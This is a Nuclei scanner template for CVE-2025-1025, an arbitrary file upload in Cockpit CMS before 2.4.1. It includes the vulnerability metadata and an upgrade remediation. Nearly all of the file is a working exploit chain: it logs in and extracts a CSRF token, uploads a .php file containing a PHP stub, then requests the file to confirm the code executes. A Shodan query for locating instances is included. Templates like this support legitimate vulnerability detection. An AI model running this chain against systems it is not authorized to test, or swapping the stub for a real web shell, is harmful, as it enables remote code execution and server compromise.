flow: http(1) && http(2) && http(3)
http:
- extractors:
  - group: 1
    internal: true
    name: csrf
    part: body
    regex:
    - 'csrf : "(.*?)"'
    type: regex
  matchers:
  - condition: and
    internal: true
    part: body
    type: word
    words:
    - success":true
    - '"role":'
  raw:
  - 'GET /auth/login HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /auth/check HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json; charset=UTF-8


    {"auth":{"user":"{{username}}","password":"{{password}}"},"csrf":"{{csrf}}"}

    '
- extractors:
  - internal: true
    json:
    - .assets[0].path
    name: upload_path
    part: body
    type: json
  matchers:
  - internal: true
    part: body
    type: word
    words:
    - '"uploaded":["{{randstr}}.php"]'
  raw:
  - 'POST /assets/upload HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3lKO5LogRxX0YStI


    ------WebKitFormBoundary3lKO5LogRxX0YStI

    Content-Disposition: form-data; name="folder"



    ------WebKitFormBoundary3lKO5LogRxX0YStI

    Content-Disposition: form-data; name="files[]"; filename="{{randstr}}.php"

    Content-Type: text/php


    <?php echo base64_decode($_GET["q"]);?>

    ------WebKitFormBoundary3lKO5LogRxX0YStI--

    '
- matchers:
  - part: body
    type: word
    words:
    - '{{marker}}'
  raw:
  - 'GET /storage/uploads/{{upload_path}}?q={{base64(marker)}} HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2025-1025
info:
  author: iamnoooob,rootxharsh,pdresearch
  classification:
    cve-id: CVE-2025-1025
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N
    cvss-score: 7.5
    cwe-id: CWE-434
    epss-percentile: 0.90841
    epss-score: 0.06605
  description: 'Versions of the package cockpit-hq/cockpit before 2.4.1 are vulnerable
    to Arbitrary File Upload where an attacker can use different extensions to bypass
    the upload filter.

    '
  impact: 'Attackers can bypass file upload filters to upload malicious PHP files,
    leading to remote code execution and complete compromise of the Cockpit CMS installation.

    '
  metadata:
    max-request: 4
    shodan-query: title:"Cockpit"
    verified: true
  name: Cockpit < 2.4.1 - Arbitrary File Upload
  reference:
  - https://github.com/advisories/GHSA-wp68-xrfg-xvq4
  - https://nvd.nist.gov/vuln/detail/CVE-2025-1025
  remediation: 'Upgrade to Cockpit version 2.4.1 or later that properly validates
    file extensions.

    '
  severity: high
  tags: cve,cve2025,cockpit,file-upload,rce,intrusive,vuln
variables:
  marker: '{{randstr_1}}'
  password: '{{password}}'
  username: '{{username}}'
